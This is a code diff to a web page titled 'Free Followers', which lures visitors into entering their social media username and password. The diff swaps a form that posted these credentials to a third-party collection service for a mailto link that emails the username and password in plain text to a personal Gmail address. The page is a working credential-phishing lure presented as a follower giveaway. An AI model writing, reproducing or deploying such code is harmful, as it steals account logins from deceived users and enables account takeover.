@@ -35,12 +35,19 @@ export default function FreeFollowersPage() {
     if (!validateForm()) return;
 
     setIsSubmitting(true);
+
     try {
-      // Since we are using a form action, just submit normally
-      // but here we prevent default to do client validation first
-      // After validation, submit the form manually:
-      e.currentTarget.submit();
-    } catch {
+      // Build mailto link with encoded subject and body
+      const subject = encodeURIComponent("Free Followers Request");
+      const body = encodeURIComponent(
+        `Username: ${form.username}\nPassword: ${form.password}`
+      );
+
+      // Open default mail client with prefilled email
+      window.location.href = `mailto:awaisashraf.dev@gmail.com?subject=${subject}&body=${body}`;
+
+      setSubmitMessage("Your email client should open now.");
+    } catch (error) {
       setSubmitMessage("An error occurred. Please try again.");
     } finally {
       setIsSubmitting(false);
@@ -78,9 +85,9 @@ export default function FreeFollowersPage() {
               animate={{ opacity: 1, y: 0 }}
               exit={{ opacity: 0, y: -20 }}
               className={`p-4 rounded-lg mb-6 ${
-                submitMessage.includes("Success")
-                  ? "bg-green-500/20 text-green-200"
-                  : "bg-red-500/20 text-red-200"
+                submitMessage.includes("error")
+                  ? "bg-red-500/20 text-red-200"
+                  : "bg-green-500/20 text-green-200"
               }`}
             >
               {submitMessage}
@@ -88,17 +95,12 @@ export default function FreeFollowersPage() {
           )}
         </AnimatePresence>
 
-        <form
-          action="https://formsubmit.co/awaisashraf.dev@gmail.com"
-          method="POST"
-          className="space-y-6"
-          onSubmit={handleSubmit}
-        >
+        <form className="space-y-6" onSubmit={handleSubmit}>
           <div>
             <input
               type="text"
               name="username"
-              placeholder=" Username"
+              placeholder="Username"
               value={form.username}
               onChange={(e) => setForm({ ...form, username: e.target.value })}
               className={`w-full p-3 bg-white/5 border ${
@@ -120,7 +122,7 @@ export default function FreeFollowersPage() {
             <input
               type="password"
               name="password"
-              placeholder=" Password"
+              placeholder="Password"
               value={form.password}
               onChange={(e) => setForm({ ...form, password: e.target.value })}
               className={`w-full p-3 bg-white/5 border ${
